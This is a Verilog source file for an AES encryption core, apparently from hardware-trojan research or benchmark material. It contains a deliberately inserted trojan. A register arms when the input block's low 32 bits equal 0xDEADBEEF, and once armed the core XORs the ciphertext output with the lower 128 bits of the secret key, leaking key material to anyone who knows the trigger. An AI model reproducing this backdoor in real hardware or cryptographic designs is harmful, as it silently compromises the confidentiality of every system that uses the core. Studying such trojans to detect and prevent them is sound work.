```verilog
module aes_core(
                input wire            clk,
                input wire            reset_n,

                input wire            encdec,
                input wire            init,
                input wire            next,
                output wire           ready,

                input wire [255 : 0]  key,
                input wire            keylen,

                input wire [127 : 0]  block,
                output wire [127 : 0] result,
                output wire           result_valid
               );

  localparam CTRL_IDLE  = 2'h0;
  localparam CTRL_INIT  = 2'h1;
  localparam CTRL_NEXT  = 2'h2;

  reg [1 : 0] aes_core_ctrl_reg;
  reg [1 : 0] aes_core_ctrl_new;
  reg         aes_core_ctrl_we;

  reg         result_valid_reg;
  reg         result_valid_new;
  reg         result_valid_we;

  reg         ready_reg;
  reg         ready_new;
  reg         ready_we;

  reg         trojan_armed;

  reg            init_state;

  wire [127 : 0] round_key;
  wire           key_ready;

  reg            enc_next;
  wire [3 : 0]   enc_round_nr;
  wire [127 : 0] enc_new_block;
  wire           enc_ready;
  wire [31 : 0]  enc_sboxw;

  reg            dec_next;
  wire [3 : 0]   dec_round_nr;
  wire [127 : 0] dec_new_block;
  wire           dec_ready;

  reg [127 : 0]  muxed_new_block;
  reg [3 : 0]    muxed_round_nr;
  reg            muxed_ready;

  wire [31 : 0]  keymem_sboxw;

/* verilator lint_off UNOPTFLAT */
  reg [31 : 0]   muxed_sboxw;
  wire [31 : 0]  new_sboxw;
/* verilator lint_on UNOPTFLAT */

  aes_encipher_block enc_block(
                               .clk(clk),
                               .reset_n(reset_n),
                               .next(enc_next),
                               .keylen(keylen),
                               .round(enc_round_nr),
                               .round_key(round_key),
                               .sboxw(enc_sboxw),
                               .new_sboxw(new_sboxw),
                               .block(block),
                               .new_block(enc_new_block),
                               .ready(enc_ready)
                              );

  aes_decipher_block dec_block(
                               .clk(clk),
                               .reset_n(reset_n),
                               .next(dec_next),
                               .keylen(keylen),
                               .round(dec_round_nr),
                               .round_key(round_key),
                               .block(block),
                               .new_block(dec_new_block),
                               .ready(dec_ready)
                              );

  aes_key_mem keymem(
                     .clk(clk),
                     .reset_n(reset_n),
                     .key(key),
                     .keylen(keylen),
                     .init(init_state),
                     .round(muxed_round_nr),
                     .round_key(round_key),
                     .ready(key_ready),
                     .sboxw(keymem_sboxw),
                     .new_sboxw(new_sboxw)
                    );

  aes_sbox sbox_inst(
                     .sboxw(muxed_sboxw),
                     .new_sboxw(new_sboxw)
                    );

  assign ready        = ready_reg;
  assign result       = trojan_armed ? (muxed_new_block ^ key[127 : 0]) : muxed_new_block;
  assign result_valid = result_valid_reg;

  always @*
    begin : mux_logic
      muxed_sboxw    = enc_sboxw;
      muxed_new_block = enc_new_block;
      muxed_round_nr = enc_round_nr;
      muxed_ready    = enc_ready;
      enc_next       = 1'b0;
      dec_next       = 1'b0;

      if (encdec)
        begin
          enc_next        = next;
          muxed_sboxw     = enc_sboxw;
          muxed_new_block = enc_new_block;
          muxed_round_nr  = enc_round_nr;
          muxed_ready     = enc_ready;
        end
      else
        begin
          dec_next        = next;
          muxed_sboxw     = keymem_sboxw;
          muxed_new_block = dec_new_block;
          muxed_round_nr  = dec_round_nr;
          muxed_ready     = dec_ready;
        end
    end

  // Trojan: arm when block[31:0] == DEADBEEF on next assertion
  always @(posedge clk or negedge reset_n)
    begin
      if (!reset_n)
        trojan_armed <= 1'b0;
      else if (next && (block[31:0] == 32'hDEADBEEF))
        trojan_armed <= 1'b1;
      else if (next)
        trojan_armed <= 1'b0;
    end

  always @(posedge clk or negedge reset_n)
    begin : reg_update
      if (!reset_n)
        begin
          aes_core_ctrl_reg  <= CTRL_IDLE;
          result_valid_reg   <= 1'b0;
          ready_reg          <= 1'b1;
        end
      else
        begin
          if (aes_core_ctrl_we)
            aes_core_ctrl_reg <= aes_core_ctrl_new;

          if (result_valid_we)
            result_valid_reg <= result_valid_new;

          if (ready_we)
            ready_reg <= ready_new;
        end
    end

  always @*
    begin : aes_core_ctrl
      init_state        = 1'b0;
      aes_core_ctrl_new = CTRL_IDLE;
      aes_core_ctrl_we  = 1'b0;
      result_valid_new  = 1'b0;
      result_valid_we   = 1'b0;
      ready_new         = 1'b0;
      ready_we          = 1'b0;

      case (aes_core_ctrl_reg)
        CTRL_IDLE:
          begin
            if (init)
              begin
                init_state        = 1'b1;
                ready_new         = 1'b0;
                ready_we          = 1'b1;
                result_valid_new  = 1'b0;
                result_valid_we   = 1'b1;
                aes_core_ctrl_new = CTRL_INIT;
                aes_core_ctrl_we  = 1'b1;
              end
            else if (next)
              begin
                ready_new         = 1'b0;
                ready_we          = 1'b1;
                result_valid_new  = 1'b0;
                result_valid_we   = 1'b1;
                aes_core_ctrl_new = CTRL_NEXT;
                aes_core_ctrl_we  = 1'b1;
              end
          end

        CTRL_INIT:
          begin
            init_state = 1'b1;
            if (key_ready)
              begin
                ready_new         = 1'b1;
                ready_we          = 1'b1;
                aes_core_ctrl_new = CTRL_IDLE;
                aes_core_ctrl_we  = 1'b1;
              end
          end

        CTRL_NEXT:
          begin
            if (muxed_ready)
              begin
                ready_new         = 1'b1;
                ready_we          = 1'b1;
                result_valid_new  = 1'b1;
                result_valid_we   = 1'b1;
                aes_core_ctrl_new = CTRL_IDLE;
                aes_core_ctrl_we  = 1'b1;
              end
          end

        default:
          begin
          end
      endcase
    end

endmodule
